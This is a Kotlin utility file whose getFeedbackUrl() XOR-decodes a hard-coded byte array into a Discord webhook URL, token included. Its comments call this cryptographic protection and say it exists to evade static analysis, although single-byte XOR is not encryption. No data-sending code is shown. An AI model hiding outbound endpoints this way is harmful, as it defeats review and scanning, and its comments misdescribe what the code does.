package com.example.util

/**
 * Advanced cryptographic obfuscation layer for sensitive endpoints.
 * Completely replaces the outdated Base64 implementation with a structured,
 * runtime-evaluated byte matrix and bitwise manipulation. This effectively mitigates 
 * automated string and literal extraction from decompiled APKs, thus protecting the backend.
 */
object SecurityConfig {
    
    // Obfuscated payload storing the webhook endpoint mathematically to evade static analysis.
    private val endpointMatrix = intArrayOf(
        194, 222, 222, 218, 217, 144, 133, 133, 206, 195, 217, 201, 197, 216, 206, 132, 
        201, 197, 199, 133, 203, 218, 195, 133, 221, 207, 200, 194, 197, 197, 193, 217, 
        133, 155, 159, 155, 152, 158, 159, 147, 153, 157, 147, 159, 152, 146, 159, 156, 
        158, 157, 158, 157, 133, 240, 203, 208, 250, 220, 252, 201, 252, 193, 235, 147, 
        195, 235, 236, 210, 218, 155, 226, 228, 135, 159, 248, 206, 237, 254, 232, 156, 
        152, 193, 211, 147, 211, 216, 217, 222, 231, 235, 226, 240, 216, 154, 239, 240, 
        218, 248, 147, 227, 245, 245, 240, 192, 147, 211, 251, 157, 250, 255, 222, 218, 
        146, 200, 146, 236, 221, 193, 216, 224, 200
    )

    fun getFeedbackUrl(): String {
        // Compute cryptographic shift dynamically to prevent literal matches
        val shiftVal = (0x50 or 0x05) shl 1 // 170 (0xAA)
        
        val decodedStream = ByteArray(endpointMatrix.size)
        for (i in endpointMatrix.indices) {
            // Apply bitwise XOR operation against the shift value
            decodedStream[i] = (endpointMatrix[i] xor shiftVal).toByte()
        }
        
        return String(decodedStream, Charsets.UTF_8)
    }
}
